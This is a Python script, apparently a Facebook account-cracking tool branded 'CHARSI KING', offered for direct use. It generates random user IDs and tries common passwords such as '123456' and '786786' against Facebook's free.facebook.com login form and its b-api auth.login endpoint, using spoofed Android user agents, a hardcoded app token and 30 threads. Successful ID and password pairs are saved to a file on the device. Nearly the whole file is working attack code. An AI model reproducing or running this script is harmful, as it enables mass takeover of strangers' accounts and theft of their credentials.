# -*- coding: utf-8 -*-
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import subprocess
import shutil
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

# --- COLORS & THEME ---
G = '\033[1;32m' # Green (Charsi)
W = '\033[1;37m' # White
R = '\033[1;31m' # Red
Y = '\033[1;33m' # Yellow
rad = '\x1b[38;5;196m'

# Suppress Warnings
from requests.exceptions import ConnectionError
requests.urllib3.disable_warnings()

# Global variables
loop = 0
oks = []
cps = []
user = []

def clear():
    os.system('clear')

def linex():
    print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}')

# --- PRO USER AGENTS (2024/2025 UPDATED) ---
def window1():
    facebook_version = f"{random.randint(400, 450)}.0.0.{random.randint(10, 99)}"
    fbbv = str(random.randint(400000000, 500000000))
    density = random.choice(['2.0', '3.0', '4.0'])
    width = random.choice(['720', '1080', '1440'])
    height = random.choice(['1280', '1920', '2560'])
    
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(10, 14)}; SM-{random.choice(['S918B', 'S908B', 'G998B', 'A546B', 'N986B'])}) [FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/0;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-{random.choice(['G973F', 'S21Ultra', 'S23Ultra'])};FBSV/{random.randint(11, 14)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua

# --- CHARSI LOGO ---
def ____banner____():
    clear()
    print(f"""{G}
      _____ _    _    _    ____  ____  ___ 
     / ____| |  | |  / \  |  _ \/ ___||_ _|
    | |    | |__| | / _ \ | |_) \___ \ | | 
    | |____|  __  |/ ___ \|  _ < ___) || | 
     \_____|_|  |_/_/   \_\_| \_\____/|___|
    {Y}========================================
    {R}[+]{W} AUTHOR  : {G}CHARSI KING (PRO)
    {R}[+]{W} STATUS  : {G}NO APPROVAL / BYPASS
    {R}[+]{W} UPDATE  : {G}2024-2025 PRO WORK
    {Y}========================================{W}""")

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        return 'OLD'
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    else: return 'OLD'

def BNG_71_():
    ____banner____()
    print(f'       {R}({W}1{R}){W}>{G} START OLD CLONING')
    print(f'       {R}({W}0{R}){W}>{G} EXIT SCRIPT')
    linex()
    opt = input(f"       {R}({W}★{R}){W}>{G} CHOICE {W}: {Y}")
    if opt in ('1', '01'):
        old_clone()
    else:
        sys.exit()

def old_clone():
    ____banner____()
    print(f'       {R}({W}A{R}){W}>{G} ALL SERIES CLONE')
    print(f'       {R}({W}B{R}){W}>{G} 2009 SPECIAL SERIES')
    linex()
    choice = input(f"       {R}({W}★{R}){W}>{G} CHOICE {W}: {Y}")
    
    ____banner____()
    limit = input(f"       {R}({W}★{R}){W}>{G} CRACK LIMIT {W}: {Y}")
    linex()
    
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 4999999999)))
        user.append(data)
    
    print(f'       {R}({W}1{R}){W}>{G} METHOD M1 (FAST)')
    print(f'       {R}({W}2{R}){W}>{G} METHOD M2 (BEST)')
    linex()
    meth = input(f"       {R}({W}★{R}){W}>{G} METHOD {W}: {Y}")
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f" {G}TOTAL IDS : {W}{limit}  {G}METHOD : {W}M{meth}")
        print(f" {G}AIRPLANE MODE ON/OFF FOR SPEED")
        linex()
        for mal in user:
            uid = star + mal
            if meth == '1':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def login_1(uid):
    global loop, oks
    sys.stdout.write(f"\r\r{W}[CHARSI-M1] {G}{loop}{W}|{G}OK:{len(oks)}")
    sys.stdout.flush()
    try:
        for pw in ['123456', '1234567', '12345678', '123456789', '786786']:
            session = requests.Session()
            ua = window1()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pw,
                "login": "Log In"
            }
            header_freefb = {
                'authority': 'free.facebook.com',
                'method': 'POST',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://free.facebook.com',
                'referer': 'https://free.facebook.com/',
                'user-agent': ua,
            }
            post_ref = session.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1', data=log_data, headers=header_freefb).text
            if 'c_user' in session.cookies.get_dict():
                print(f"\r\r{G}[CHARSI-OK] {uid} | {pw} | {creationyear(uid)}{W}")
                oks.append(uid)
                open('/sdcard/CHARSI-OK.txt', 'a').write(f"{uid}|{pw}\n")
                break
            elif 'checkpoint' in session.cookies.get_dict():
                # print(f"\r\r{Y}[CHARSI-CP] {uid} | {pw}{W}")
                cps.append(uid)
                break
        loop += 1
    except:
        pass

def login_2(uid):
    global loop, oks
    sys.stdout.write(f"\r\r{W}[CHARSI-M2] {G}{loop}{W}|{G}OK:{len(oks)}")
    sys.stdout.flush()
    try:
        for pw in ['123456', '1234567', '12345678', '123123', '786786']:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'user-agent': window1(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            res = requests.get(url, headers=headers).json()
            if 'session_key' in res:
                print(f"\r\r{G}[CHARSI-OK] {uid} | {pw} | {creationyear(uid)}{W}")
                oks.append(uid)
                open('/sdcard/CHARSI-OK.txt', 'a').write(f"{uid}|{pw}\n")
                break
        loop += 1
    except:
        pass

if __name__ == '__main__':
    # Direct start - No Key Approval
    BNG_71_()
